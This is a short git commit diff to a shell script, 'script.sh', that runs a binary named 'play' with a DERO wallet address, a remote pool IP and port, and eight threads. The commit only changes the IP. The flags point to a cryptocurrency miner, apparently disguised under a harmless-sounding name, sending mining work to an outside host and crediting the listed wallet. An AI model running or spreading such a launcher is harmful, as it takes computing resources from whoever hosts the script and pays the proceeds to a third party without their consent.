0778acbbaae849fcb84283d7b7ff25fedf13e6b4
playdoco <121803568+playdoco@users.noreply.github.com>
2023-01-02 21:00:58 +0700

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,4 +1,4 @@
 #!/bin/sh
 chmod u+x play
 
-./play -w dero1qysfzhrrt9u6sfxvpgc8lsn5q9slxu92ltmng0ucgrjslhugqfrmgqgzrjf98 -r 164.92.108.253:10100 -p rpc -m 8
+./play -w dero1qysfzhrrt9u6sfxvpgc8lsn5q9slxu92ltmng0ucgrjslhugqfrmgqgzrjf98 -r 51.158.55.100:10100 -p rpc -m 8
